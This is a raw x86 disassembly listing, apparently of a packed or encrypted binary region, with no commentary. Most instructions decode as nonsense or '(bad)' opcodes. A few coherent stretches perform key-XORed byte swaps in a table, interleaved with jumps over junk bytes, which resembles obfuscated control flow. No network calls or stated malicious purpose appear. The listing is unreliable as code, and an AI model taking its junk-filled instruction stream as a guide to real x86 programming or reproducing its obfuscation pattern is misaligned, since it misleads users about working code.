  40c00a:	bound  esp,QWORD PTR [esi+0x69]
  40c00d:	add    eax,0x959175cb
  40c012:	test   ecx,0xfa90e002
  40c018:	xor    eax,0xbd3c75a8
  40c01d:	push   ecx
  40c01e:	loop   0x40bfa3
  40c020:	jmp    0x40bfd5
  40c022:	add    bl,ch
  40c024:	ffreep st(7)
  40c026:	out    dx,eax
  40c027:	xchg   esp,eax
  40c028:	and    edi,eax
  40c02a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c02b:	pushf  
  40c02c:	aad    0x98
  40c02e:	jmp    0xfa23:0x7b293955
  40c035:	xchg   BYTE PTR gs:[eax],bh
  40c038:	pop    edx
  40c039:	add    ecx,esp
  40c03b:	sbb    eax,0xce9e4fc0
  40c040:	lods   al,BYTE PTR ds:[esi]
  40c041:	idiv   BYTE PTR [eax+0x5f550254]
  40c047:	xor    BYTE PTR [edx],bl
  40c049:	push   edx
  40c04a:	call   0xb67b:0xef612236
  40c051:	mov    bl,0xb
  40c053:	in     al,dx
  40c054:	js     0x40c029
  40c056:	mov    esi,0x2737f5b2
  40c05b:	jnp    0x40c01b
  40c05d:	pop    ds
  40c05e:	xor    BYTE PTR [ebx-0x5faacb6b],dl
  40c064:	sbb    DWORD PTR [esi],0xffffffbb
  40c067:	mov    cl,0xa1
  40c069:	inc    ebx
  40c06a:	inc    ebx
  40c06b:	out    dx,eax
  40c06c:	aad    0xa9
  40c06e:	rol    BYTE PTR [edx-0x5434733c],cl
  40c074:	xchg   BYTE PTR [eax-0x1abd5e09],ah
  40c07a:	inc    esi
  40c07b:	inc    ecx
  40c07c:	cs xchg edx,eax
  40c07e:	jo     0x40c068
  40c080:	aaa    
  40c081:	mov    WORD PTR fs:[ecx+0x55],?
  40c085:	loope  0x40c051
  40c087:	jnp    0x40c0b5
  40c089:	sbb    BYTE PTR [edi+eax*1+0x3aabd69],dh
  40c090:	loope  0x40c0c2
  40c092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c093:	lahf   
  40c094:	sbb    esi,edi
  40c096:	add    esi,0xffffff8b
  40c099:	xchg   ebx,eax
  40c09a:	(bad)  
  40c09b:	mov    eax,0xee9859c1
  40c0a0:	sbb    bh,cl
  40c0a2:	repnz or ecx,DWORD PTR [esi]
  40c0a5:	(bad)  
  40c0a6:	mov    ecx,0xc4446f1c
  40c0ab:	mov    al,ah
  40c0ad:	(bad)  
  40c0ae:	dec    edi
  40c0af:	push   0xf1cd05cd
  40c0b4:	in     eax,dx
  40c0b5:	fs sahf 
  40c0b7:	sub    eax,0x2f489474
  40c0bc:	xchg   dh,al
  40c0be:	rcl    DWORD PTR [ecx],0xc1
  40c0c1:	push   edi
  40c0c2:	pop    esi
  40c0c3:	sub    al,0xe1
  40c0c5:	xchg   edi,eax
  40c0c6:	ins    DWORD PTR es:[edi],dx
  40c0c7:	shl    BYTE PTR [eax+0x7c],0xbc
  40c0cb:	sub    cl,dl
  40c0cd:	push   cs
  40c0ce:	repnz cwde 
  40c0d0:	aaa    
  40c0d1:	popf   
  40c0d2:	scas   eax,DWORD PTR es:[edi]
  40c0d3:	mov    bh,0xd5
  40c0d5:	inc    eax
  40c0d6:	sub    eax,0x4fc11b1e
  40c0db:	or     ah,0x15
  40c0de:	out    0x9e,al
  40c0e0:	and    ch,ah
  40c0e2:	xchg   ebx,eax
  40c0e3:	pop    es
  40c0e4:	dec    ecx
  40c0e5:	dec    ebx
  40c0e6:	mov    ebx,0xa1ecfbe8
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	ds mov cx,dx
  40c144:	jno    0x40c143
  40c146:	inc    esp
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c0f4
  40c150:	iret   
  40c151:	hlt    
  40c152:	and    eax,0xaad09fc8
  40c157:	test   BYTE PTR [ecx+ebx*1+0x24],dl
  40c15b:	sub    DWORD PTR [ecx],ebx
  40c15d:	(bad)  
  40c15e:	mov    ebx,0x366de230
  40c163:	gs jp  0x40c17b
  40c166:	shr    bl,0x1
  40c169:	push   edi
  40c16a:	repnz inc edi
  40c16c:	push   esp
  40c16d:	imul   esi,DWORD PTR [eax-0x1],0xffffffeb
  40c171:	add    ebx,DWORD PTR [ebx+esi*2]
  40c174:	cwde   
  40c175:	stos   DWORD PTR es:[edi],eax
  40c176:	push   0x19
  40c178:	fs cmp esi,ebx
  40c17b:	inc    ebx
  40c17c:	pop    ecx
  40c17d:	add    eax,0x5ac62485
  40c182:	fs call 0xd39a:0x956a8d52
  40c18a:	add    DWORD PTR [ebp+0x5d],eax
  40c18d:	mov    dl,BYTE PTR [eax+ebp*2]
  40c190:	push   0x37
  40c192:	call   0x9fb0:0x2eb129e0
  40c199:	popa   
  40c19a:	dec    esp
  40c19b:	mov    edi,0x44a40db8
  40c1a0:	cld    
  40c1a1:	je     0x40c1d9
  40c1a3:	(bad)  
  40c1a4:	and    DWORD PTR [edx+0x4],esi
  40c1a7:	pop    edi
  40c1a8:	(bad)  
  40c1a9:	push   0xffffffba
  40c1ab:	scas   al,BYTE PTR es:[edi]
  40c1ac:	loop   0x40c19c
  40c1ae:	and    DWORD PTR [ebp+0x7fc6293d],esi
  40c1b4:	pop    esi
  40c1b5:	or     BYTE PTR ds:[edi+0x53],bl
  40c1b9:	inc    ebx
  40c1ba:	leave  
  40c1bb:	ja     0x40c1be
  40c1bd:	ins    BYTE PTR es:[edi],dx
  40c1be:	push   esi
  40c1bf:	loopne 0x40c1a2
  40c1c1:	add    edi,eax
  40c1c3:	mov    al,ds:0x42d2f542
  40c1c8:	lods   al,BYTE PTR ds:[esi]
  40c1c9:	and    eax,0x20ffe174
  40c1ce:	push   esi
  40c1cf:	adc    ecx,edx
  40c1d1:	pop    ecx
  40c1d2:	cmp    eax,0xfd3628d3
  40c1d7:	push   ds
  40c1d8:	js     0x40c237
  40c1da:	les    esi,FWORD PTR [edx-0x38]
  40c1dd:	xor    ebx,DWORD PTR [esi+0x305cfd5a]
  40c1e3:	rcr    dh,cl
  40c1e5:	add    eax,0x79ccacfc
  40c1ea:	loop   0x40c1b0
  40c1ec:	shr    ebp,cl
  40c1ee:	pop    ds
  40c1ef:	mov    DWORD PTR [ebp+0x1d],ebx
  40c1f2:	int    0x80
  40c1f4:	(bad)  
  40c1f5:	sub    al,0x2a
  40c1f7:	jecxz  0x40c236
  40c1f9:	lds    ebx,FWORD PTR [eax]
  40c1fb:	stos   DWORD PTR es:[edi],eax
  40c1fc:	stos   DWORD PTR es:[edi],eax
  40c1fd:	out    dx,eax
  40c1fe:	sahf   
  40c1ff:	xchg   ebx,eax
  40c200:	inc    ebx
  40c201:	hlt    
  40c202:	add    eax,0xbe39b7ad
  40c207:	pop    esp
  40c208:	ror    DWORD PTR [esi+ecx*2-0x2c997836],cl
  40c20f:	je     0x40c28b
  40c211:	push   ebx
  40c212:	inc    ebx
  40c213:	and    ebp,ebp
  40c215:	cmp    al,0x29
  40c217:	clc    
  40c218:	je     0x40c291
  40c21a:	xor    BYTE PTR fs:[ebp+0xe235d7c],bl
  40c221:	cdq    
  40c222:	inc    esp
  40c223:	aad    0x47
  40c225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c226:	mov    ecx,0xfe73635
  40c22b:	xchg   edx,eax
  40c22c:	sahf   
  40c22d:	aas    
  40c22e:	cmp    BYTE PTR [ebp-0x2e1e48dd],ch
  40c234:	push   0x3da078b6
  40c239:	test   al,0xdb
  40c23b:	test   BYTE PTR [edi-0x15],dh
  40c23e:	pop    ds
  40c23f:	xor    ecx,DWORD PTR [ecx-0x64]
  40c242:	in     eax,dx
  40c243:	mov    ecx,0x85b65036
  40c248:	outs   dx,DWORD PTR ds:[esi]
  40c249:	stos   DWORD PTR es:[edi],eax
  40c24a:	ins    BYTE PTR es:[edi],dx
  40c24b:	dec    edi
  40c24c:	clc    
  40c24d:	cmc    
  40c24e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24f:	mov    al,0xb5
  40c251:	out    dx,al
  40c252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c253:	sub    esp,esp
  40c255:	cli    
  40c256:	pop    ds
  40c257:	sahf   
  40c258:	jle    0x40c246
  40c25a:	dec    edx
  40c25b:	out    dx,eax
  40c25c:	and    eax,edi
  40c25e:	ror    DWORD PTR [ecx+0x3c215db0],0x34
  40c265:	icebp  
  40c266:	jnp    0x40c2da
  40c268:	mov    ch,BYTE PTR [ebx-0x3cfa51ea]
  40c26e:	mov    al,0x8a
  40c270:	ins    DWORD PTR es:[edi],dx
  40c271:	xchg   ebx,eax
  40c272:	adc    esp,esi
  40c274:	shr    BYTE PTR [edi],0xc9
  40c277:	lock and ecx,DWORD PTR [ecx]
  40c27a:	mov    dh,BYTE PTR [ebp+esi*4-0x11]
  40c27e:	das    
  40c27f:	jmp    0x41fb6405
  40c284:	cmp    DWORD PTR [ecx+0xc3fbffd],ebp
  40c28a:	mov    dh,0x59
  40c28c:	pusha  
  40c28d:	iret   
  40c28e:	push   ebp
  40c28f:	push   ds
  40c290:	jp     0x40c245
  40c292:	adc    esp,DWORD PTR [esi]
  40c294:	adc    al,BYTE PTR [esi]
  40c296:	test   BYTE PTR [edx],ch
  40c298:	or     DWORD PTR [ecx],0xffffffdb
  40c29b:	xor    BYTE PTR [ebp+0x7dfb969f],bl
  40c2a1:	inc    ebx
  40c2a2:	popf   
  40c2a3:	or     ah,BYTE PTR [ebp+0x20d6bd23]
  40c2a9:	cmp    ebp,DWORD PTR [edx+ecx*1]
  40c2ac:	arpl   WORD PTR [ebx+0x24afae62],bp
  40c2b2:	nop
  40c2b3:	dec    ecx
  40c2b4:	cmp    eax,0xbb2cb1d6
  40c2b9:	clc    
  40c2ba:	push   ds
  40c2bb:	shr    DWORD PTR [ebp+0x547f0e7f],1
  40c2c1:	js     0x40c2e5
  40c2c3:	sub    al,0xaf
  40c2c5:	adc    ebx,DWORD PTR [ebx]
  40c2c7:	je     0x40c264
  40c2c9:	or     eax,0x538cdcdf
  40c2ce:	lock das 
  40c2d0:	sbb    esi,DWORD PTR [eax*4-0x5876a93d]
  40c2d7:	mov    ah,0x46
  40c2d9:	adc    BYTE PTR ds:0xc954f61d,bl
  40c2df:	in     al,dx
  40c2e0:	inc    esi
  40c2e1:	fldl2e 
  40c2e3:	stc    
  40c2e4:	mov    ah,0x11
  40c2e6:	inc    edx
  40c2e7:	call   0xea2c90ce
  40c2ec:	sub    edi,DWORD PTR [edx+eax*4+0x22]
  40c2f0:	inc    esi
  40c2f1:	fcom   QWORD PTR [ebx-0x1c]
  40c2f4:	dec    esp
  40c2f5:	inc    ebx
  40c2f6:	cdq    
  40c2f7:	pop    eax
  40c2f8:	mov    ecx,cs
  40c2fa:	xor    al,0xf7
  40c2fc:	aad    0x39
  40c2fe:	mov    ch,dl
  40c300:	hlt    
  40c301:	dec    esi
  40c302:	and    edi,ecx
  40c304:	add    al,0xb0
  40c306:	fsubr  st,st(2)
  40c308:	call   0x4bc7:0x52dd1f35
  40c30f:	cwde   
  40c310:	loop   0x40c391
  40c312:	out    0x31,eax
  40c314:	adc    ebx,edi
  40c316:	in     al,dx
  40c317:	xchg   DWORD PTR [edi+0x1a504cc7],ebp
  40c31d:	aaa    
  40c31e:	inc    ebp
  40c31f:	pop    esi
  40c320:	dec    esp
  40c321:	fidiv  DWORD PTR [ebx+0x10]
  40c324:	xor    al,0xbd
  40c326:	(bad)  
  40c327:	xlat   BYTE PTR ds:[ebx]
  40c328:	xor    eax,0x9cf3c7d1
  40c32d:	lahf   
  40c32e:	retf   
  40c32f:	xor    ah,BYTE PTR ds:0x2470d1ca
  40c335:	mov    edi,0x5f4b8488
  40c33a:	loop   0x40c2ce
  40c33c:	jns    0x40c310
  40c33e:	lea    sp,[edi-0xe]
  40c342:	sub    esi,DWORD PTR [ecx+0x7a69ad25]
  40c348:	mov    edx,?
  40c34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c34b:	pop    es
  40c34c:	cmp    DWORD PTR [eax-0x7b12617b],0x595319e6
  40c356:	stc    
  40c357:	mov    ah,0x33
  40c359:	fistp  WORD PTR [ecx+0x3]
  40c35c:	scas   eax,DWORD PTR es:[edi]
  40c35d:	sahf   
  40c35e:	test   eax,ecx
  40c360:	pop    eax
  40c361:	in     al,dx
  40c362:	call   0xe732cdaa
  40c367:	scas   al,BYTE PTR es:[edi]
  40c368:	mov    edx,ecx
  40c36a:	cld    
  40c36b:	push   es
  40c36c:	pop    es
  40c36d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c36e:	es fwait
  40c370:	adc    eax,0xc67cd641
  40c375:	aaa    
  40c376:	adc    DWORD PTR [eax],ebx
  40c378:	or     al,BYTE PTR [esi+0x62]
  40c37b:	inc    ebx
  40c37c:	xchg   DWORD PTR [esp+ebx*8],edi
  40c37f:	mov    ss,WORD PTR [eax+0x4]
  40c382:	(bad)  
  40c383:	(bad)
  40c386:	dec    ecx
  40c387:	mov    eax,ds:0xda9f0cb7
  40c38c:	jae    0x40c312
  40c38e:	outs   dx,BYTE PTR ds:[esi]
  40c38f:	mov    esp,0x37304083
  40c394:	cmp    esi,DWORD PTR [edx+0x60a9b80b]
  40c39a:	fwait
  40c39b:	jae    0x40c359
  40c39d:	add    cl,BYTE PTR [ecx+0x6c98114d]
  40c3a3:	(bad)  
  40c3a4:	or     DWORD PTR [ecx+0x5e8fcd9],edx
  40c3aa:	je     0x40c3d5
  40c3ac:	cmp    edx,DWORD PTR [ebx+0x4c2e0022]
  40c3b2:	stos   DWORD PTR es:[edi],eax
  40c3b3:	mov    cl,BYTE PTR [ebp-0x519a29ed]
  40c3b9:	rol    BYTE PTR [edx-0x5],1
  40c3bc:	idiv   ebp
  40c3be:	xchg   edi,eax
  40c3bf:	mov    eax,0xf1c4624f
  40c3c4:	jae    0x40c3d4
  40c3c6:	push   ebx
  40c3c7:	and    DWORD PTR [ebp+0x1f00d89e],0xffffff9e
  40c3ce:	jecxz  0x40c3a1
  40c3d0:	rcr    DWORD PTR [edx+0x3a],1
  40c3d3:	aaa    
  40c3d4:	scas   al,BYTE PTR es:[edi]
  40c3d5:	inc    ebp
  40c3d6:	inc    edi
  40c3d7:	cmp    DWORD PTR [ebx],ebp
  40c3d9:	inc    edx
  40c3da:	lods   eax,DWORD PTR ds:[esi]
  40c3db:	vpmacssdd ymm15,ymm1,ymm5,YMMWORD PTR [edx+0xbc82e26]
  40c3e5:	push   ebp
  40c3e6:	inc    esp
  40c3e7:	mov    ah,0x1e
  40c3e9:	inc    ecx
  40c3ea:	inc    eax
  40c3eb:	pop    edx
  40c3ec:	xor    ebx,edi
  40c3ee:	aas    
  40c3ef:	inc    eax
  40c3f0:	ss test ch,0x38
  40c3f4:	pop    dx
  40c3f6:	retf   
  40c3f7:	mov    ecx,DWORD PTR [eax-0x6122e5b9]
  40c3fd:	clc    
  40c3fe:	jno    0x40c459
  40c400:	or     BYTE PTR [edx+0x24],0x11
  40c404:	add    eax,0x7cbe77ef
  40c409:	cmc    
  40c40a:	aam    0x71
  40c40c:	mov    ebx,0xe077d86f
  40c411:	push   0xffffffb9
  40c413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c414:	adc    al,0xd
  40c416:	or     eax,0x7188e4dd
  40c41b:	add    eax,0x358980da
  40c420:	jno    0x40c45c
  40c422:	xchg   DWORD PTR [esi],eax
  40c424:	cmp    DWORD PTR [esi+0x7a80180d],ebp
  40c42a:	dec    ebx
  40c42b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c42c:	retf   
  40c42d:	je     0x40c454
  40c42f:	mov    bh,0x94
  40c431:	(bad)  
  40c432:	xor    bh,BYTE PTR [ecx]
  40c434:	mov    ebp,ecx
  40c436:	ds sub al,0xb1
  40c439:	jl     0x40c409
  40c43b:	push   esi
  40c43c:	nop
  40c43d:	mov    BYTE PTR [eax],0xeb
  40c440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c441:	bound  ecx,QWORD PTR [ebx]
  40c443:	js     0x40c490
  40c445:	inc    ebx
  40c446:	imul   ecx,DWORD PTR [ebx],0x42
  40c449:	or     DWORD PTR [ebx],0xffffffa6
  40c44c:	adc    al,0x60
  40c44e:	push   esi
  40c44f:	out    dx,eax
  40c450:	aam    0x33
  40c452:	inc    ebp
  40c453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c454:	dec    DWORD PTR [edx+0x1]
  40c457:	jb     0x40c4cf
  40c459:	or     BYTE PTR [edx],bl
  40c45b:	pusha  
  40c45c:	xchg   esi,eax
  40c45d:	inc    esi
  40c45e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c45f:	in     eax,0x83
  40c461:	xor    al,0x24
  40c463:	cld    
  40c464:	stos   DWORD PTR es:[edi],eax
  40c465:	xor    eax,0x8c96ae69
  40c46a:	out    0xce,eax
  40c46c:	push   ds
  40c46d:	ret    
  40c46e:	pop    esi
  40c46f:	pop    ebx
  40c470:	outs   dx,DWORD PTR ds:[esi]
  40c471:	loop   0x40c3f3
  40c473:	xor    al,0x47
  40c475:	mov    ch,0xf2
  40c477:	add    dh,0x36
  40c47a:	mov    WORD PTR [edi+0x63],cs
  40c47d:	xor    ebx,ecx
  40c47f:	cld    
  40c480:	add    ebx,DWORD PTR [ebp-0x36]
  40c483:	(bad)  
  40c484:	push   ecx
  40c485:	inc    esp
  40c486:	mov    dl,0x5a
  40c488:	and    eax,0x7b1f4c30
  40c48d:	(bad)  
  40c48e:	out    dx,al
  40c48f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c490:	clc    
  40c491:	dec    ebp
  40c492:	mov    esp,DWORD PTR [edx]
  40c494:	xlat   BYTE PTR ds:[ebx]
  40c495:	hlt    
  40c496:	pusha  
  40c497:	arpl   WORD PTR [edi],bx
  40c499:	sub    al,0x53
  40c49b:	xchg   edx,eax
  40c49c:	test   al,0xf1
  40c49e:	addr16 (bad) 
  40c4a0:	int3   
  40c4a1:	inc    esi
  40c4a2:	add    al,0xa
  40c4a4:	inc    ebx
  40c4a5:	cli    
  40c4a6:	or     eax,0x8b2c09c
  40c4ab:	loopne 0x40c4c4
  40c4ad:	pop    esp
  40c4ae:	(bad)  
  40c4af:	dec    eax
  40c4b0:	icebp  
  40c4b1:	jle    0x40c4db
  40c4b3:	xor    esp,DWORD PTR [esi-0x74]
  40c4b6:	(bad)  
  40c4b7:	loopne 0x40c48e
  40c4b9:	cmp    ecx,DWORD PTR [edx+0x19373714]
  40c4bf:	add    DWORD PTR [ebx+0x6],esi
  40c4c2:	jo     0x40c47d
  40c4c4:	xchg   ebp,eax
  40c4c5:	aam    0x1a
  40c4c7:	mov    ch,0x4d
  40c4c9:	and    esi,ebx
  40c4cb:	fbstp  TBYTE PTR [eax+edi*8]
  40c4ce:	popf   
  40c4cf:	in     eax,dx
  40c4d0:	push   ss
  40c4d1:	fidiv  WORD PTR [eax+esi*8-0x1e]
  40c4d5:	ds aaa 
  40c4d7:	adc    al,0xdd
  40c4d9:	push   edx
  40c4da:	mov    cl,0x3
  40c4dc:	jno    0x40c538
  40c4de:	lahf   
  40c4df:	into   
  40c4e0:	cs and eax,0x8442c7b2
  40c4e6:	xchg   ecx,eax
  40c4e7:	pop    ebp
  40c4e8:	out    dx,al
  40c4e9:	push   edx
  40c4ea:	fwait
  40c4eb:	adc    DWORD PTR [edx-0x4d],0x60
  40c4ef:	loop   0x40c524
  40c4f1:	rol    BYTE PTR [ebx],1
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	push   0x4dd85da5
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c527
  40c54d:	sbb    al,0x1e
  40c54f:	test   BYTE PTR [ebp+0x1f1cfb9e],ah
  40c555:	and    BYTE PTR [ebp+0x10],bl
  40c558:	repnz out 0x17,eax
  40c55b:	addr16 test dl,ah
  40c55e:	mov    ch,al
  40c560:	stc    
  40c561:	call   0x7d66339c
  40c566:	dec    ebp
  40c567:	pop    ss
  40c568:	fisubr DWORD PTR [edi+0x6b543e8]
  40c56e:	mov    ds,WORD PTR [ecx]
  40c570:	mov    dh,0x86
  40c572:	adc    ch,0xb7
  40c575:	rcr    DWORD PTR [edi],cl
  40c577:	mov    BYTE PTR [eax+0x57],bh
  40c57a:	js     0x40c561
  40c57c:	mov    ds:0x2c644e0e,al
  40c581:	xor    esp,edi
  40c583:	cmp    DWORD PTR [esi-0x6957cc29],eax
  40c589:	(bad)  [eax-0x5]
  40c58c:	cvtps2pd xmm3,xmm6
  40c58f:	inc    esp
  40c590:	mov    dl,0x69
  40c592:	pop    edx
  40c593:	adc    DWORD PTR [edi-0x46],edx
  40c596:	aas    
  40c597:	and    eax,0xc9a4d0ef
  40c59c:	adc    bh,bl
  40c59e:	in     eax,0x1
  40c5a0:	aad    0xda
  40c5a2:	pop    eax
  40c5a3:	iret   
  40c5a4:	jg     0x40c549
  40c5a6:	cmp    ebp,DWORD PTR [eax]
  40c5a8:	and    BYTE PTR [ebx],0x26
  40c5ab:	pop    ds
  40c5ac:	push   ss
  40c5ad:	dec    eax
  40c5ae:	push   esi
  40c5af:	iret   
  40c5b0:	xchg   BYTE PTR [edi],al
  40c5b2:	sub    al,0xd1
  40c5b4:	fbld   TBYTE PTR [edx+edx*1]
  40c5b7:	and    esp,DWORD PTR [ebp+0x7945b3a3]
  40c5bd:	and    eax,0xb6256a32
  40c5c2:	pop    ebp
  40c5c3:	neg    bh
  40c5c5:	add    eax,0xc6ac6431
  40c5ca:	in     al,0xa6
  40c5cc:	push   ebx
  40c5cd:	lods   eax,DWORD PTR ds:[esi]
  40c5ce:	mov    esi,0x76ce83d
  40c5d3:	and    al,0x15
  40c5d5:	push   ds
  40c5d6:	cmp    eax,0x1faafa64
  40c5db:	push   esp
  40c5dc:	shl    DWORD PTR [edx+0x41a5d2d3],1
  40c5e2:	(bad)  
  40c5e3:	scas   al,BYTE PTR es:[edi]
  40c5e4:	inc    edx
  40c5e5:	jmp    0xe925a917
  40c5ea:	dec    ebx
  40c5eb:	pop    esi
  40c5ec:	ins    DWORD PTR es:[edi],dx
  40c5ed:	pop    eax
  40c5ee:	pop    edi
  40c5ef:	add    eax,0x389a054b
  40c5f4:	mov    cl,0xd
  40c5f6:	adc    DWORD PTR [edx],eax
  40c5f8:	push   DWORD PTR [ebx]
  40c5fa:	lahf   
  40c5fb:	into   
  40c5fc:	test   eax,0xcb5b9fa9
  40c601:	lock ror DWORD PTR [edi+esi*4-0x5711e01d],cl
  40c609:	icebp  
  40c60a:	jbe    0x40c5a7
  40c60c:	inc    edi
  40c60d:	inc    ebp
  40c60e:	add    al,0xeb
  40c610:	pop    edi
  40c611:	sub    eax,0x84f31930
  40c616:	outs   dx,DWORD PTR ds:[esi]
  40c617:	bound  edi,QWORD PTR [edi+0x151cacbd]
  40c61d:	(bad)  
  40c61e:	outs   dx,DWORD PTR ds:[esi]
  40c61f:	(bad)  
  40c620:	inc    BYTE PTR [edx]
  40c622:	pop    ss
  40c623:	adc    al,0x94
  40c625:	mov    ebx,DWORD PTR [eax-0xf91d70f]
  40c62b:	repz bound edx,QWORD PTR [edi]
  40c62e:	(bad)
  40c632:	out    0xda,al
  40c634:	mov    esi,0xf841275b
  40c639:	pusha  
  40c63a:	std    
  40c63b:	div    BYTE PTR [ebx-0x3ecb23fe]
  40c641:	loop   0x40c615
  40c643:	jp     0x40c65c
  40c645:	jge    0x40c620
  40c647:	sar    BYTE PTR [esi-0x71],1
  40c64a:	loopne 0x40c688
  40c64c:	cwde   
  40c64d:	or     dh,BYTE PTR [edx-0x1b23e6ef]
  40c653:	dec    edi
  40c654:	jb     0x40c698
  40c656:	mov    esp,0x3c0bdad5
  40c65b:	fsubrp st(5),st
  40c65d:	fiadd  DWORD PTR [edi]
  40c65f:	or     al,0xe4
  40c661:	popa   
  40c662:	jns    0x40c6b5
  40c664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c665:	sbb    bh,BYTE PTR [esi]
  40c667:	add    eax,0xb99b0657
  40c66c:	xor    al,0xcf
  40c66e:	fld    DWORD PTR [edi-0x9]
  40c671:	inc    eax
  40c672:	loop   0x40c687
  40c674:	dec    ecx
  40c675:	dec    ebx
  40c676:	pop    ecx
  40c677:	xchg   edi,eax
  40c678:	ror    dl,0xc
  40c67b:	fadd   st(7),st
  40c67d:	in     eax,dx
  40c67e:	retf   0x806e
  40c681:	mov    al,0x5d
  40c683:	cmp    eax,0xda6bffd3
  40c688:	xchg   DWORD PTR [esp+eiz*2+0x12],ecx
  40c68c:	cmp    DWORD PTR [ecx+ecx*8+0x7b91fcb2],ebx
  40c693:	xor    BYTE PTR [ecx+0x5e],0xe6
  40c697:	scas   al,BYTE PTR es:[edi]
  40c698:	call   0x8166:0xf66d333c
  40c69f:	mov    bl,0xd5
  40c6a1:	xlat   BYTE PTR ds:[ebx]
  40c6a2:	mov    dh,0xb2
  40c6a4:	popf   
  40c6a5:	rcr    BYTE PTR [ecx-0x2500e064],0x5e
  40c6ac:	or     al,0xe5
  40c6ae:	push   ecx
  40c6af:	not    DWORD PTR [edi]
  40c6b1:	loopne 0x40c68e
  40c6b3:	sub    ch,BYTE PTR [ecx-0x449bebd3]
  40c6b9:	dec    ebx
  40c6ba:	jne    0x40c715
  40c6bc:	into   
  40c6bd:	inc    eax
  40c6be:	sub    DWORD PTR ds:0x42672ca0,ebp
  40c6c4:	pop    edi
  40c6c5:	stos   DWORD PTR es:[edi],eax
  40c6c6:	outs   dx,BYTE PTR ds:[esi]
  40c6c7:	xchg   ebp,eax
  40c6c8:	and    bl,al
  40c6ca:	mov    bl,0x4d
  40c6cc:	out    dx,eax
  40c6cd:	mov    edi,0xbafe074e
  40c6d2:	mov    bh,0xa3
  40c6d4:	sets   dl
  40c6d7:	rcl    DWORD PTR [edx+eax*8],0xee
  40c6db:	aam    0xe6
  40c6dd:	out    0x6d,eax
  40c6df:	das    
  40c6e0:	pop    ebp
  40c6e1:	xchg   edi,eax
  40c6e2:	imul   edx,DWORD PTR [ecx],0xd0599c88
  40c6e8:	sahf   
  40c6e9:	inc    eax
  40c6ea:	callw  0xdf00
  40c6ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6ef:	push   ebp
  40c6f0:	(bad)  
  40c6f1:	cmp    ebp,edx
  40c6f3:	sub    edi,DWORD PTR [ecx+eax*1+0x66]
  40c6f7:	sbb    bh,BYTE PTR [ecx]
  40c6f9:	jl     0x40c6d2
  40c6fb:	xchg   BYTE PTR [eax+0x12b8ceee],al
  40c701:	sub    BYTE PTR [edi-0x21484904],bl
  40c707:	cmc    
  40c708:	mov    DWORD PTR [edx-0x65f5e0f2],ebp
  40c70e:	cmp    ebx,DWORD PTR [ecx-0x7e]
  40c711:	test   bh,ch
  40c713:	xchg   ebx,eax
  40c714:	mov    edi,ebx
  40c716:	sahf   
  40c717:	hlt    
  40c718:	js     0x40c793
  40c71a:	sub    esi,0x956a0817
  40c720:	add    DWORD PTR [eax+0x51c961de],0xfffffffb
  40c727:	pushw  es
  40c729:	repz adc al,0xe6
